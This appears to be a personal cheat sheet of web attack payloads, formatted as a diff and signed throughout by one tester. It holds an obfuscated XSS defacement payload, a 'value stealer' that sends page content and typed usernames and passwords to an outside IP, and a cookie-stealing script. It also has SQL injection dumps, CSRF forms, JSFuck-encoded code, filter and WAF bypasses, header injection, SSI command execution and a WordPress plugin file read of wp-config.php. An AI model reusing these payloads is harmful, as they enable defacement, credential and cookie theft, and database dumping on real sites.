+Deface with XSS: document.documentElement.innerHTML=String.fromCharCode(32, 60, 104, 116, 109, 108, 62, 32, 60, 104, 101, 97, 100, 62, 32, 60, 116, 105, 116, 108, 101, 62, 91, 33, 93, 32, 83, 116, 114, 117, 99, 107, 32, 98, 121, 32, 68, 52, 114, 107, 32, 70, 51, 52, 114, 60, 47, 116, 105, 116, 108, 101, 62, 32, 60, 108, 105, 110, 107, 32, 104, 114, 101, 102, 61, 39, 104, 116, 116, 112, 58, 47, 47, 102, 111, 110, 116, 115, 46, 103, 111, 111, 103, 108, 101, 97, 112, 105, 115, 46, 99, 111, 109, 47, 99, 115, 115, 63, 102, 97, 109, 105, 108, 121, 61, 73, 99, 101, 108, 97, 110, 100, 39, 32, 114, 101, 108, 61, 39, 115, 116, 121, 108, 101, 115, 104, 101, 101, 116, 39, 32, 116, 121, 112, 101, 61, 39, 116, 101, 120, 116, 47, 99, 115, 115, 39, 62, 32, 32, 60, 47, 104, 101, 97, 100, 62, 32, 60, 98, 111, 100, 121, 32, 98, 103, 99, 111, 108, 111, 114, 32, 61, 32, 34, 98, 108, 97, 99, 107, 34, 62, 32, 60, 99, 101, 110, 116, 101, 114, 62, 32, 60, 102, 111, 110, 116, 32, 102, 97, 99, 101, 61, 34, 73, 99, 101, 108, 97, 110, 100, 34, 62, 32, 32, 60, 98, 114, 62, 32, 60, 98, 114, 62, 32, 60, 98, 114, 62, 32, 60, 102, 111, 110, 116, 32, 99, 111, 108, 111, 114, 61, 34, 119, 104, 105, 116, 101, 34, 32, 115, 105, 122, 101, 61, 34, 49, 48, 34, 32, 62, 91, 33, 93, 32, 83, 116, 114, 117, 99, 107, 32, 66, 121, 32, 68, 52, 114, 107, 32, 70, 51, 52, 114, 60, 47, 102, 111, 110, 116, 62, 32, 60, 98, 114, 62, 32, 60, 102, 111, 110, 116, 32, 99, 111, 108, 111, 114, 61, 34, 109, 97, 103, 101, 110, 116, 111, 34, 32, 115, 105, 122, 101, 61, 34, 53, 34, 32, 62, 67, 111, 110, 115, 105, 100, 101, 114, 32, 116, 104, 105, 115, 32, 116, 104, 101, 32, 114, 101, 118, 101, 110, 103, 101, 32, 111, 102, 32, 121, 111, 117, 114, 32, 84, 114, 111, 108, 108, 115, 60, 47, 102, 111, 110, 116, 62, 32, 60, 98, 114, 62, 32, 60, 98, 114, 62, 32, 60, 98, 114, 62, 32, 60, 102, 111, 110, 116, 32, 99, 111, 108, 111, 114, 61, 34, 119, 104, 105, 116, 101, 34, 32, 115, 105, 122, 101, 61, 34, 53, 34, 32, 62, 83, 111, 44, 32, 121, 111, 117, 32, 103, 117, 121, 115, 32, 116, 104, 105, 110, 107, 32, 105, 116, 39, 115, 32, 102, 117, 110, 32, 109, 101, 115, 115, 105, 110, 103, 32, 119, 105, 116, 104, 32, 104, 97, 99, 107, 101, 114, 115, 32, 114, 105, 103, 104, 116, 63, 32, 89, 111, 117, 32, 106, 117, 115, 116, 32, 109, 97, 100, 101, 32, 121, 111, 117, 114, 32, 119, 111, 114, 115, 116, 32, 109, 105, 115, 116, 97, 107, 101, 32, 98, 121, 32, 100, 111, 105, 110, 103, 32, 116, 104, 105, 115, 46, 32, 87, 101, 32, 97, 114, 101, 32, 110, 111, 116, 32, 108, 105, 107, 101, 32, 104, 111, 119, 32, 119, 101, 32, 97, 114, 101, 32, 115, 104, 111, 119, 110, 32, 105, 110, 32, 109, 111, 118, 105, 101, 115, 44, 32, 119, 101, 32, 97, 114, 101, 32, 119, 111, 114, 115, 116, 32, 116, 104, 97, 110, 32, 116, 104, 97, 116, 44, 32, 121, 111, 117, 32, 103, 111, 116, 32, 110, 111, 32, 105, 100, 101, 97, 32, 97, 98, 111, 117, 116, 32, 116, 104, 97, 116, 32, 97, 116, 32, 116, 104, 101, 32, 109, 111, 109, 101, 110, 116, 46, 32, 89, 111, 117, 32, 100, 111, 110, 39, 116, 32, 101, 118, 101, 110, 32, 107, 110, 111, 119, 32, 104, 111, 119, 32, 119, 111, 114, 115, 116, 32, 116, 104, 105, 115, 32, 99, 97, 110, 32, 103, 101, 116, 44, 32, 121, 111, 117, 32, 106, 117, 115, 116, 32, 103, 111, 116, 32, 116, 114, 111, 108, 108, 101, 100, 32, 98, 121, 32, 116, 114, 111, 108, 108, 105, 110, 103, 32, 117, 115, 58, 60, 47, 102, 111, 110, 116, 62, 32, 60, 98, 114, 62, 32, 60, 98, 114, 62, 32, 60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 111, 110, 116, 101, 110, 116, 46, 102, 108, 104, 101, 50, 45, 49, 46, 102, 110, 97, 46, 102, 98, 99, 100, 110, 46, 110, 101, 116, 47, 118, 47, 116, 49, 46, 48, 45, 57, 47, 50, 48, 50, 57, 50, 55, 55, 51, 95, 56, 48, 49, 51, 57, 57, 52, 49, 57, 57, 56, 52, 54, 55, 50, 95, 51, 55, 52, 49, 54, 50, 53, 55, 55, 53, 51, 53, 48, 56, 51, 48, 51, 48, 56, 95, 110, 46, 106, 112, 103, 63, 95, 110, 99, 95, 101, 117, 105, 50, 61, 118, 49, 37, 51, 65, 65, 101, 71, 98, 50, 69, 77, 88, 72, 53, 72, 78, 89, 76, 72, 72, 119, 68, 119, 53, 48, 115, 73, 84, 81, 121, 70, 76, 82, 53, 68, 77, 81, 76, 82, 48, 104, 111, 88, 119, 86, 68, 89, 78, 55, 114, 49, 73, 97, 85, 75, 107, 75, 49, 114, 81, 118, 89, 73, 120, 97, 82, 88, 113, 76, 50, 102, 66, 119, 49, 120, 48, 81, 83, 85, 79, 115, 83, 73, 53, 68, 110, 102, 79, 83, 51, 57, 89, 45, 114, 110, 77, 48, 56, 102, 78, 98, 102, 52, 108, 105, 80, 79, 102, 88, 86, 118, 45, 100, 95, 114, 66, 99, 102, 66, 87, 82, 83, 99, 80, 80, 76, 73, 84, 67, 54, 53, 69, 112, 122, 103, 38, 111, 104, 61, 48, 49, 99, 52, 48, 54, 100, 101, 98, 98, 54, 49, 98, 57, 51, 100, 100, 102, 54, 51, 57, 98, 55, 48, 53, 98, 102, 51, 99, 102, 49, 48, 38, 111, 101, 61, 53, 57, 69, 70, 67, 67, 66, 51, 34, 32, 115, 116, 121, 108, 101, 61, 34, 119, 105, 100, 116, 104, 58, 53, 48, 37, 59, 104, 101, 105, 103, 104, 116, 58, 56, 48, 37, 34, 62, 32, 60, 98, 114, 62, 32, 60, 98, 114, 62, 32, 60, 102, 111, 110, 116, 32, 99, 111, 108, 111, 114, 61, 34, 119, 104, 105, 116, 101, 34, 32, 115, 105, 122, 101, 61, 34, 53, 34, 32, 62, 84, 104, 105, 115, 32, 99, 111, 117, 108, 100, 32, 103, 101, 116, 32, 119, 111, 114, 115, 116, 44, 32, 98, 117, 116, 32, 105, 32, 116, 104, 105, 110, 107, 32, 105, 116, 32, 105, 115, 32, 101, 110, 111, 117, 103, 104, 116, 32, 116, 111, 32, 119, 97, 114, 110, 32, 121, 111, 117, 46, 60, 47, 102, 111, 110, 116, 62, 32, 60, 98, 114, 62, 32, 60, 102, 111, 110, 116, 32, 99, 111, 108, 111, 114, 61, 34, 109, 97, 103, 101, 110, 116, 111, 34, 32, 115, 105, 122, 101, 61, 34, 53, 34, 32, 62, 62, 32, 66, 101, 119, 97, 114, 101, 60, 47, 102, 111, 110, 116, 62, 32, 60, 98, 114, 62)
+
+
+/__swift/config/config.php.new
+
+DIOS by Shawar(tables+columns): concat/**/(0x3c62723e3c2f62723e,0x2e3a204434726b2046333472203a2e,0x3c62723e3c2f62723e,0x4461746162617365206e616d653a20,database(),@:=0,(Select+count(*)from(information_schema./**/columns)where(table_schema=database())and@:=concat/**/(@,0x3c6c693e,table_name,0x20202d2d2d2d2d2d3e2020,column_name)),@)
+
+Shawar's Value Stealer: <svg onload="document.location='http://139.190.94.252/stealer/home directory/basic/?c=' %2b document.body.innerHTML;">
+<img src=x onerror="document.location='http://localhost/stealer/home directory/basic/index.php?c=' %2b'user:' %2b ' ' %2b document.getElementsByTagName('input')[0].value %2b '  \n' %2b 'password:' %2b document.getElementsByTagName('input')[1].value ;">
+
+DOIS by Shawar(column data):
++and+0+Union+select+concat(0x3c2f7469746c653e,(select (@) from (select (@:=0x00), (select (@) from tblMember where (@) in (@:=concat(@,0x3c62723e,0x3c666f6e742073697a653d22352220636f6c6f723d22726564223e​,Member_Name,0x3c2f666f6e743e,0x2d2d3e,0x3c666f6e742073697a653d22342220636f6c6f7​23d22677265656e223e,Date_Time_Created,0x3c2f666f6e743e,0x2d2d3e,0x3c666f6e742063​6f6c6f723d22626c7565223e,Date_Time_Modified,0x3c2f666f6e743e))))a)),2,3,4--
+
+Reflected File download: www.site.com/payloadhere?id=1 payload: injected%20%in%20json%7C%7Ccalc.exe%7C%7C
+
+Hi,
+
+This is an urgent issue and wish you fix it as soon as possible ...
+
+so this web application " site " is potentially vulnerable ( RC4 in TLS is Broken ) 
+
+I see that this site accept tls 128bits rc4-sha or rc4-md5 in the prefered server cipher 
+
+
+so all users at risk ... 
+
+
+How to fix this vulnerability 
+
+
+work with AES cipher for more secure 
+
+
+
+
+Wish you best fix ,
+
+
+xss='style='border:solid;'onmouseover=alert(1)'
+
+'"\%a0'%a0\
+
+
+PUT CSRF: <script>
+function put() {
+	var x = new XMLHttpRequest();
+	x.open("PUT","http://bank.com/transfer.do",true);
+	x.setRequestHeader("Content-Type", "application/json"); 
+	x.send(JSON.stringify({"acct":"BOB", "amount":100})); 
+}
+</script>
+<body onload="put()">
+
+;/ChromeSetup.bat;/ChromeSetup.bat?gs_ri=psy-ab&q=%22||calc.exe||
+
+jaVaScrIpt://alert(0);//http:// 
+
+data:text/html;<script>alert(0)</script>
+
+XSS by Double URL Encoding view-source:http://247pearsoned.custhelp.com/app/error/error_id/404/url/%252Fapp%252Fnl%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dprompt(%2522XSSed%2520by%2520Shawar%2522)%253E
+
+<meta http-equiv="X-Frame-Options" content="DENY">
+
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+
+dig axfr @ns12.zoneedit.com zonetransfer.me
+
+in url context: j a vas cript:confirm(1);
+
+<a/href=javas&Tab;cript&colon;confirm(top.location)>XSS
+
+https://www.branah.com/unicode-converter BEST!!!
+
+http://textmechanic.com/ASCII-to
+
+-Unicode-Converter.html
+
+http://textmechanic.com/ASCII-to-Unicode-Converter.html
+When spaceis not allowed: <p/id=1%0Aonmousemove%0A=%0Aconfirm`1`> %0A is used
+t = \u0074
+
+alert = aler\u0074
+prompt = p\u0072om\u0070\u0074
+confirm = co\u006efir\u006d
+javascript = j&#x00041vascr&#x00069pt
+: = &colon;
+( = &lpar;
+) = &rpar;
+using alert(/xss/) in a link = alert%28 /xss/%29 example: <a href=”javascript:alert%28 /xss/%29″>clickme
+base64 alert(2) = data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+
+</script%0a> 
+</script -_->
+</script anythinggoesher
+decodeURI
+data.replace     or    replace
+window.location.replace
+' = &apos   in JS world = &apos;-confirm(1)-&apos; 
+
+
+<p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>
+
+empty space in payload = %0A     E.g  <img/src=x%0Aonerror=prompt`1`>
+
+confirm`1`    =    confirm(1)
+
+
+JSON CSRF: <form action=http://192.168.1.41:3000 method=post enctype="text/plain" >  
+<input name='{"a":1,"b":{"c":3}},"ignore_me":"' value='test"}' type='hidden'>  
+<input type=submit>  
+</form>
+
+
+
+<HTML xmlns: ><audio>
+<audio src=wp onerror=alert(0X1)>
+
+
+DNS MISSCONFIGURATION: Your localhost.hackerone.com has address 127.0.0.1 and this may lead to "Same- Site" Scripting.
+
+Here is detailed description of this minor security issue (by Tavis Ormandy): http://www.securityfocus.com/archive/1/486606/30/0/threaded
+
+
+
+
+%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Ccenter%3E%3Ch1%3EHacked%3C/h1%3E%3C/center%3E
+
+CSLF
+
+
+HEX: %25%32%32%25%33%45%25%33%43%69%6d%67%25%32%30%73%72%63%25%33%44%78%25%32%30%6f%6e%65%72%72%6f%72%25%33%44%70%72%6f%6d%70%74%25%32%38%31%25%32%39%25%33%45 
+
+news.skype.com/readme.html
+
+spiceworks.com/%0d%0a%20SomeCustomInjectedHeader:injected_by_wvs 
+
+header injction
+
+
+%0d%0a%20SomeCustomInjectedHeader:injected_by_Shawar_Khan
+
+SSI: < !–#exec cmd=”ls” –>
+
+avg case: 02360912
+
+mail: http://shawarkhan.com:2082/xferwebmail
+http://shawarkhan.com:2095/cpsess5386110713/webmail/paper_lantern/index.html?mailclient=roundcube
+
+http://shawarkhan.com/wp-includes/wlwmanifest.xml
+
+WP EXPLOIT: 
+/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+
+inurl:wp-content/uploads/dump.sql
+
+
+POST CSRF by SHAWAR : http://jsfiddle.net/9br54hhk/
+
+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([][[]]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
+
+
+
+HTTP ONLY FLAG ISSUE: vulnerable URL:https://portal.int.qiwi.com/login.php
+The PHPSESSID cookie does not have the HTTPOnly flag set. 
+When a cookie is set with the HTTPOnly flag, it instructs the browser that the cookie can only accessed by the server and not by client-side scripts. 
+This is an important security protection for session cookies.
+
+
+
+
+
+"><iframe/srcdoc=HTML-ENCODE-Payload>
+
+open redirection in WP:http://androidmechanic.com/wp-content/plugins/wp-js-external-link-info-1.21/redirect.php?url=http://www.hotfile.com/dl/198306106/26e7704/I9100XWLSJ_I9100OXXLS7_NEE.zip.html
+
+POST CSRF: http://jsfiddle.net/cfs4q193/1/
+
+double encoded xss: %2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dprompt%25281%2529%253E
+
+header injection:
+%0d%0aFoo:+bar
+
+wp-includes/js/plupload/plupload.flash.swf?id=\"));}catch(e){alert(1);}//
+
+XSS payload for challenges: 
+alert("Site: "+ document.domain + "\nAttacker: Shawar Khan");
+
+IFRAME XSS with HTMLchar encoding:
+<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;/xss/&rpar;&gt;"/>
+
+Opera Link-source JavaScript execution via CSS:
+-o-link:'javascript:alert(1)';-o-link-source:current
+
+testing suported ciphers suite , BEAST and CRIME attack
+java -jar TestSSLServer.jar www3.example.com 443
+
+XSS deface:
+
+<style type="text/css">
+body{visibility:hidden;};head{visibility:hidden;};</style>
+<div style="visibility:visible;text-align:center;">
+	<script>alert("XSSed by Shawar Khan")</script><h1>XSSed By Shawar Khan</h1></div>
+
+checking for cert info,weak ciphers and sslv3:
+nmap --script ssl-cert,ssl-enum-ciphers -p 443,465,993,995 www.example.com
+
+https://gist.github.com/xsscx/530fa25964f94e74d7c1
+payloads
+
+Mod sec bypasS:  <scri%00pt>alert(0);</scri%00pt>
+
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+
+-----------------------
+output-required: UTF-8
+-----UTF-32------------
+double quot = ∀
+< bracket   = 㰀
+> bracket   = 㸀 
+payload     = ∀㸀㰀script㸀alert(1)㰀/script㸀
+urlencoded: %E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80
+http://www.w3schools.com/tags/ref_urlencode.asp
+-----------------------------------------------
+ja&Tab;vasc&NewLine:ript&colon;alert&lpar;1&rpar;
+&#39;; confirm(1); &#39;
+<img src=x id=confirm(1) onerror=eval(id)
+
+
+Cookie Stealing:
+"><script>location.href = "http://127.0.0.1/cookie/cookie.php?cookie="+document.cookie;</script>
+
+
+“<” 	“%3C” 	“%25” 	“%253C”
+“/” 	“%2F” 	“%25” 	“%252F”
+“>” 	“%3E” 	“%25” 	“%253E” 
+'       %27              %25%32%37
+http://attacker.com’-alert(1)-‘7amama let’s 
+
+<?php phpinfo(); ?>
+
+j&#x00000000000041vascr&#x00000000000069pt:alert(1)
+JSON: "+alert(/XSS/.source)+"Bar
+FPD fix error_reporting(0);
+
+http://www.swingnote.com/tools/texttohex.php
+
+blind sqli test: 1' and 1=0 union select null,table_name from information_schema.tables#
+
+ %u00ABscript%u00BB
+----------------------------------------------------
